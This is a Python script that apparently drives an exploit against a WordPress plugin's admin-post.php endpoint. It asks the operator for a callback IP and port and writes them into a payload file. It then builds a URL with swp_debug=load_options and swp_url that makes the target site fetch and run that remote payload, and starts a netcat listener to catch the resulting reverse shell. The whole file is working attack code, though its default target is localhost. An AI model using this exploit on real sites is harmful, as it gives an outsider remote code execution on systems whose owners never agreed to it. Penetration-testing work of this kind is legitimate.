import subprocess
import webbrowser


def foo():

    # Starting point
    print("Hello chief! Do you want to exploit this vulnerability? [y/n]")

    yes = {'yes', 'y'}
    no = {'no', 'n'}
    choice = raw_input().lower()
    if choice in yes:
        # Make sure user enters the wanted IP.
        print("Seems about right. Remember to prompt \"exit\" twice when you are done. \n"
              "Input the IP you want the target to connect back to:")
        back_ip = raw_input()
        print("Confirm: [y/n]")
        confirm = raw_input()
        confirmed = False
        if confirm in no:
            while not confirmed:
                print("Input the IP you want the target to connect back to:")
                back_ip = raw_input()
                print("Confirm: [y/n]")
                confirm = raw_input()
                if confirm in yes:
                    confirmed = True
        print("Target website will connect back to " + back_ip)

        # Make sure the user enters the wanted port.
        print("Input the port you want the target to connect back to:")
        port = raw_input()
        print("Confirm: [y/n]")
        confirm = raw_input()
        confirmed = False
        if confirm in no:
            while not confirmed:
                print("Input the port you want the target to connect back to:")
                port = raw_input()
                print("Confirm: [y/n]")
                confirm = raw_input()
                if confirm in yes:
                    confirmed = True
        print("Port " + port + " will be used.")

        # Modify the payload file in order to set ip and port
        modify_payload_ip_port(back_ip, port)

        # Composing URLs, listening for connections and connecting to target
        listen(str(port))

        # Delete ip and port fields inside the payload file
        standardize_payload(back_ip, port)

        print("Connection closed.")
        return True

    elif choice in no:
        print("Understandable. Have a nice day.")
        return False
    else:
        print("Please respond with 'yes' or 'no'. Bye.")


def listen(port):
    print("Input the \"IP:port\" or the domain name of the target site. "
          "Hit enter to use testing configuration (localhost:8888):")
    target_ip = raw_input()
    connect_to_target(target_ip, port)


def connect_to_target(target_ip, port):
    payload_path = "localhost:8888/PenTest/payload.txt"
    if target_ip == "":
        target_ip = "localhost:8888"
        target_url = "http://{0}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{1}".format(
            target_ip, payload_path)
    else:
        target_url = "http://{0}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{1}".format(
            target_ip, payload_path)

    print(target_url)

    print("Connecting to target...")
    webbrowser.open(target_url, new=0, autoraise=False)
    subprocess.check_call(["nc", "-l", port])


def modify_payload_ip_port(ip, port):

    with open('payload.txt', 'r') as in_file:
        payload = in_file.read()
        in_file.close()

    payload = payload.replace('ip = ', 'ip = \\\"' + ip + '\\\"')
    payload = payload.replace('port = ', 'port = ' + str(port))

    with open('payload.txt', 'w') as out_file:
        out_file.write(payload)
        out_file.close()


def standardize_payload(ip, port):
    with open('payload.txt', 'r') as in_file:
        payload = in_file.read()
        in_file.close()

    payload = payload.replace('ip = \\\"' + ip + '\\\"', 'ip = ')
    payload = payload.replace('port = ' + str(port), 'port = ')

    with open('payload.txt', 'w') as out_file:
        out_file.write(payload)
        out_file.close()


foo()
